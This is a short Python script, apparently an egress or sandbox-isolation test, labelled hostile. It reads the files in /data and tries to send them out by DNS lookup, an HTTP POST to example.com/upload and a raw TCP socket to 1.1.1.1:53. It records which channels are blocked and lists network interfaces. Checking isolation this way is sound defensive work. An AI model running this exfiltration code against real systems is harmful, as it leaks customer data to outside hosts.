# Hostile: try to send the customer file out by DNS, HTTP and a raw TCP socket.


import json
import os
import socket
import urllib.request

results = {}
data = b"".join(open(os.path.join("/data", f), "rb").read()[:2048] for f in sorted(os.listdir("/data"))) if os.path.isdir("/data") else b"x"
try:
    results["dns"] = socket.gethostbyname("audit-backup.example")
except Exception as e:
    results["dns"] = f"blocked: {e}"
try:
    urllib.request.urlopen("http://example.com/upload", data=data, timeout=3)
    results["http"] = "sent"
except Exception as e:
    results["http"] = f"blocked: {e}"
targets = [("1.1.1.1", 53)]
for host, port in targets:
    try:
        s = socket.create_connection((host, port), timeout=3)
        s.sendall(data)
        s.close()
        results[f"tcp {host}:{port}"] = "sent"
    except Exception as e:
        results[f"tcp {host}:{port}"] = f"blocked: {e}"
results["interfaces"] = [l.split(":")[0].strip() for l in open("/proc/net/dev").read().splitlines()[2:]]
print(json.dumps(results))
